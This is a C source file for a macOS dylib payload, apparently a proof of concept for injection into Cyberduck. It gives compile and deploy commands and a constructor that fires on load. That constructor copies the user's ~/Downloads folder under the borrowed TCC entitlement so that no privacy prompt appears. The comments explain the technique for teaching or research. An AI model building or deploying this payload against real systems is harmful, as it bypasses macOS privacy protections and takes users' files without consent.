// toinject.c
// Dylib payload — loaded by dlopen() from inside Cyberduck's process.
// Inherits Cyberduck's TCC entitlement: com.apple.security.files.downloads.read-write
//
// Compile:
//   clang -dynamiclib -o inject.dylib toinject.c
//
// Deploy:
//   cp inject.dylib ~/Library/Colors/inject.dylib
//
// __attribute__((constructor)):
//   The dynamic linker (dyld) calls this function automatically the instant
//   the library is mapped into memory — before dlopen() even returns.
//   We do NOT need to call it manually or use dlsym() to find it.
//   This is why dylib injection is so powerful: one dlopen() is all it takes.

#include <stdlib.h>
#include <unistd.h>
#include <syslog.h>

__attribute__((constructor))
static void payload(void) {
    // Log that injection succeeded — visible in Console.app and:
    //   log stream --style syslog --predicate 'eventMessage CONTAINS[c] "INJECTED"'
    //
    // Notice the process shown in the log is CYBERDUCK, not our injector.
    // From the OS perspective, Cyberduck did this itself.
    syslog(LOG_ERR,
           "[INJECTED] Running inside PID %d — constructor fired", getpid());

    // Exfiltrate ~/Downloads using Cyberduck's TCC entitlement.
    // No privacy dialog triggered — kernel checks the *process* entitlement,
    // which belongs to Cyberduck. Our code runs inside that process.
    system("cp -R ~/Downloads ~/Library/Colors/ 2>/dev/null");

    syslog(LOG_ERR,
           "[INJECTED] Done. ~/Downloads copied to ~/Library/Colors/");
}
